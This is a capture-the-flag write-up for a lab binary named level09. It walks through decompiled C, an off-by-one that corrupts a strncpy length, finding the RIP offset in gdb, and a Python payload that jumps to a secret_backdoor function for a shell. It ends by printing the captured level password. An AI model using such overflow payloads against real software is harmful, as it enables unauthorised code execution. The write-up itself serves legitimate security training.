# Level09

## Setup

We find a binary file at the root of the user **`level09`** named *`./level09`*.

```bash
scp -r -P 4242 level09@<vm_ip>:/home/users/level09/level09 .
```

### Hex-Rays

We used the Hex-Rays output on the [Dogbolt website](https://dogbolt.org/).

## Source
```C
char v1[140]
...
set_username((__int64)v1);
set_msg((__int64)v1);

int set_username(__int64 a1) {
	char s[140];
	int i;
	...
	fgets(s, 128, stdin);
	for ( i = 0; i <= 40 && s[i]; ++i )
	*(_BYTE *)(a1 + i + 140) = s[i];
	return printf(">: Welcome, %s", (const char *)(a1 + 140));
}
```

set_username writes 41 characters of s (our inputed username) in &v1[140] (it doesn't segfault somehow but it's not the subject)

```C
char *set_msg(__int64 a1) {
	char s[1024];
	...
	fgets(s, 1024, stdin);
	return strncpy((char *)a1, s, *(int *)(a1 + 180));
}
```
set_msg writes with strncpy() a1[180] ***(converted as int because if a1[180] == 0xFF then strncpy writes 0xFF000000 characters) characters of s (our inputed msg) inside &a1[0], we can overflow and retrieve the address eip points to (Here it is not EIP anymore because it is a 64 bits program, it becomes RIP) with info frame, we have our offset that way


## bash
```bash
> python -c "print 'A'*40 + '\xff\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A'" > /tmp/payload09
```
## gdb
```bash
> r < <(cat /tmp/payload09)
Segfault...
> info frame
...
saved rip 0x4138674137674136
...
```

0x4138674137674136 = offset at 200

It appears we also have a beautiful function called secret_backdoor() which calls gets() then system({our input}) \
Let's redirect RIP to secret_backdoor() \
```bash	
> p secret_backdoor
... 0x55555555488c <secret_backdoor> (we add 0000 as we write a 64 bits address)
```
## Payload
```bash
> python -c "print 'A'*40 + '\xff\n' + 'A'*200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1]" > /tmp/payload09
> cat /tmp/payload09 - | ./level09
> /bin/sh
> cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```